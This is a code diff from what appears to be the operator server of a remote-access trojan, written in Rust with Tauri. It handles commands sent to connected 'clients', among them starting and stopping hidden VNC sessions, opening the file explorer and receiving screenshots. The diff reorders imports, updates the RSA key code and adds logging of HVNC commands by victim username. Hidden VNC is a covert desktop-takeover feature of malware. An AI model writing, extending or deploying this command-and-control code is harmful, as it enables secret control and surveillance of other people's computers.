@@ -1,24 +1,26 @@
-use std::collections::HashMap;
-use std::net::SocketAddr;
-use tokio::sync::mpsc::{Receiver, Sender};
-
-use std::sync::{Arc, Mutex};
 use tauri::{AppHandle, Emitter};
+
+use std::collections::HashMap;
+use tokio::sync::mpsc::{Receiver, Sender};
+use std::net::SocketAddr;
+
+use std::sync::{ Arc, Mutex };
 
 use common::packets::ClientInfo;
 
+use rsa::{RsaPrivateKey, RsaPublicKey};
+use rsa::pkcs8::EncodePublicKey;
+use rsa::rand_core::OsRng;
 use base64::{engine::general_purpose, Engine as _};
-use rand::rngs::OsRng;
-use rsa::{pkcs8::ToPublicKey, RsaPrivateKey, RsaPublicKey};
 
 use common::packets::*;
 
-use crate::commands::*;
 use anyhow::{Context, Result};
+use crate::commands::*;
 use common::RSA_BITS;
 
-use crate::utils::encryption::{handle_encryption_confirm, handle_encryption_request};
 use crate::utils::logger::Logger;
+use crate::utils::encryption::{handle_encryption_request, handle_encryption_confirm};
 
 pub struct ServerWrapper {
     receiver: Receiver<ServerCommand>,
@@ -355,12 +357,16 @@ impl ServerWrapper {
                 }
 
                 StartHVNC(addr) => {
-                    self.send_client_packet(&addr, ClientboundPacket::StartHVNC)
-                        .await
+                    if let Some(client) = self.connected_users.get(&addr) {
+                        self.log_events.log("cmd_sent", format!("Starting HVNC on client [{}] [{}]", addr, client.username)).await;
+                        self.send_client_packet(&addr, ClientboundPacket::StartHVNC).await  
+                    }
                 }
                 StopHVNC(addr) => {
-                    self.send_client_packet(&addr, ClientboundPacket::StopHVNC)
-                        .await
+                    if let Some(client) = self.connected_users.get(&addr) {
+                        self.log_events.log("cmd_sent", format!("Stopping HVNC on client [{}] [{}]", addr, client.username)).await;
+                        self.send_client_packet(&addr, ClientboundPacket::StopHVNC).await  
+                    }
                 }
                 OpenExplorer(addr) => {
                     self.send_client_packet(&addr, ClientboundPacket::OpenExplorer)
@@ -395,18 +401,6 @@ impl ServerWrapper {
                         "data": general_purpose::STANDARD.encode(&data)
                     })).await;
                 },
-
-                HVNCFrame(addr, data) => {
-                    println!("HVNCFrame received from {}", addr);
-                    self.emit_serde_payload(
-                        "hvnc_frame",
-                        serde_json::json!({
-                            "addr": addr.to_string(),
-                            "data": general_purpose::STANDARD.encode(&data)
-                        }),
-                    )
-                    .await;
-                }
 
                 // Client data responses - consolidated pattern
                 ScreenshotData(addr, data) => {
